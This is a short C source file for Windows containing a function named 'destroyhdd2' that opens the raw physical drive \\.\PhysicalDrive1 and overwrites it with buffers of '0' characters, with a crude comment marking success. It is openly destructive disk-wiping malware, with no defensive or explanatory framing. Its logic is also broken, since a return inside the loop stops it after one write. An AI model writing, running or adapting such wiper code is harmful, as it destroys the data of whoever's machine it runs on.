#include <Windows.h>

#define BUFFER_SIZE1 1024000

DWORD WINAPI destroyhdd2(LPVOID)
{
DWORD write;
int k1 = 0;
char buf1[BUFFER_SIZE1] = {0};
for(k1=0;k1<BUFFER_SIZE1;k1++) // Fill buffer
buf1[k1] = '0'; // With 0
BOOL bSuccess2;
HANDLE devHandle2 = NULL;
devHandle2 = CreateFileA("\\\\.\\PhysicalDrive1", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0 ,NULL);

unsigned long secCount = 0;
while(true)
{
        bSuccess2 = WriteFile(devHandle2, buf1, 1024000, &write, NULL);

        if (bSuccess2 & (write < 1024000))
        {
            break;
        }

        if(!bSuccess2)
        {
            break;
        }

        if(bSuccess2 && write>0)
        {
			//fucked
        }

        secCount++;
		return 0;
}
}